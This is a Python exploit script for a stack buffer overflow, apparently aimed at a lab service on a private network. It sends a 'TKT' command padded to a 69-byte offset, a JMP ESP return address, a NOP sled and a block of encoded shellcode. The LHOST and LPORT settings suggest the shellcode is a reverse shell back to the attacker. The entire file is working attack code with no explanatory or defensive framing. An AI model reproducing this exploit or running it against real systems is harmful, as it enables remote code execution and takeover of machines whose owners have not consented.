import socket
import struct
import sys

HOST = "192.168.197.56"
PORT = 20025

LHOST = "192.168.193.96"
LPORT = 7001

OFFSET = 69
JMP_ESP = 0x625011AF

def generate_shellcode():
	shellcode =  b""
	shellcode += b"\xbd\x35\xf0\xaa\x2c\xda\xdf\xd9\x74\x24\xf4"
	shellcode += b"\x5a\x33\xc9\xb1\x5e\x31\x6a\x15\x83\xea\xfc"
	shellcode += b"\x03\x6a\x11\xe2\xc0\x0c\x42\xa3\x2a\xed\x93"
	shellcode += b"\xdc\xa3\x08\xa2\xce\xd7\x59\x97\xde\x9c\x0c"
	shellcode += b"\x14\x94\xf0\xa4\x2b\x1d\xbe\xe2\x02\x9e\xb5"
	shellcode += b"\x99\x4c\x51\x09\xf1\xb1\xf0\xf5\x08\xe6\xd2"
	shellcode += b"\xc4\xc2\xfb\x13\x01\x95\x76\xfb\xdf\xad\x2b"
	shellcode += b"\x13\x54\xf3\xf7\x12\xba\xa3\x8c\x55\x42\xc9"
	shellcode += b"\x53\x21\xfe\xd0\x83\x41\xa6\xf2\x22\x85\xdd"
	shellcode += b"\xbb\x3c\x79\x64\xf2\x49\x45\x2f\x8e\x86\x3e"
	shellcode += b"\xae\x46\xd7\xbf\x81\xa6\xd9\x8f\xec\x8a\xdb"
	shellcode += b"\xc8\xd6\x32\xae\x22\x25\xce\xa9\xf0\x54\x14"
	shellcode += b"\x3f\xe7\xfe\xdf\xe7\xc3\xff\x0c\x71\x87\xf3"
	shellcode += b"\xf9\xf5\xcf\x17\xff\xda\x7b\x23\x74\xdd\xab"
	shellcode += b"\xa2\xce\xfa\x6f\xef\x95\x63\x29\x55\x7b\x9b"
	shellcode += b"\x29\x31\x24\x39\x21\xd3\x33\x3d\xca\x2c\x3c"
	shellcode += b"\x63\x5d\xe1\xf1\x9c\x9d\x6d\x81\xef\xaf\x32"
	shellcode += b"\x39\x78\x9c\xbb\xe7\x7f\x95\xab\x17\xaf\x1d"
	shellcode += b"\xbb\xe9\x50\x5e\x92\x2d\x04\x0e\x8c\x84\x25"
	shellcode += b"\xc5\x4c\x28\xf0\x70\x46\xbe\x3b\x2c\x93\x09"
	shellcode += b"\xd4\x2f\x1b\x6d\x40\xb9\xfd\xc1\xd8\xe9\x51"
	shellcode += b"\xa2\x88\x49\x01\x4a\xc3\x45\x7e\x6a\xec\x8f"
	shellcode += b"\x17\x01\x03\x66\x40\xbe\xba\x23\x1a\x5f\x42"
	shellcode += b"\xfe\x67\x5f\xc8\x0b\x98\x2e\x39\x79\x8a\x47"
	shellcode += b"\x5e\x81\x52\x98\xcb\x81\x38\x9c\x5d\xd5\xd4"
	shellcode += b"\x9e\xb8\x11\x7b\x60\xef\x21\x7b\x9e\x6e\x10"
	shellcode += b"\xf0\xa9\xe4\x1c\x6e\xd6\xe8\x9c\x6e\x80\x62"
	shellcode += b"\x9d\x06\x74\xd7\xce\x33\x7b\xc2\x62\xe8\xee"
	shellcode += b"\xed\xd2\x5d\xb8\x85\xd8\xb8\x8e\x09\x22\xef"
	shellcode += b"\x8c\x4e\xdc\x72\xbb\xf6\xb5\x8c\xfb\x06\x46"
	shellcode += b"\xe6\xfb\x56\x2e\xfd\xd4\x59\x9e\xfe\xfe\x31"
	shellcode += b"\xb6\x75\x6f\xf3\x27\x8a\xba\x55\xf6\x8b\x49"
	shellcode += b"\x4e\x09\xf6\x22\x71\xea\x07\x2b\x16\xea\x08"
	shellcode += b"\x53\x28\xd6\xdf\x6a\x5e\x19\xdc\xc8\x41\x84"
	shellcode += b"\xc8\x24\xea\x11\x99\x84\x77\xa2\x74\xca\x81"
	shellcode += b"\x21\x7c\xb3\x75\x39\xf5\xb6\x32\xfd\xe6\xca"
	shellcode += b"\x2b\x68\x08\x78\x4b\xb9"    
	return shellcode

def exploit():
    offset = OFFSET
    jmp_esp = JMP_ESP
    
    shellcode = generate_shellcode()
    
    nop_sled = b"\x90" * 32
    
    payload = (
        b"TKT" +
        b"A" * offset +
        struct.pack("<I", jmp_esp) +
        nop_sled +
        shellcode
    )
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((HOST, PORT))
        
        welcome = s.recv(1024)
        print(f"Received: {welcome.decode().strip()}")
        
        s.send(payload)
        
        try:
            response = s.recv(1024)
            print(f"Response: {response.decode().strip()}")
        except:
            print("No response")
        
        s.close()
        
    except socket.timeout:
        print("Timeout")
    except ConnectionRefusedError:
        print("Connection refused")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        LHOST = sys.argv[1]
    if len(sys.argv) > 2:
        LPORT = int(sys.argv[2])
    if len(sys.argv) > 3:
        OFFSET = int(sys.argv[3])
    if len(sys.argv) > 4:
        JMP_ESP = int(sys.argv[4], 16)
    
    exploit()

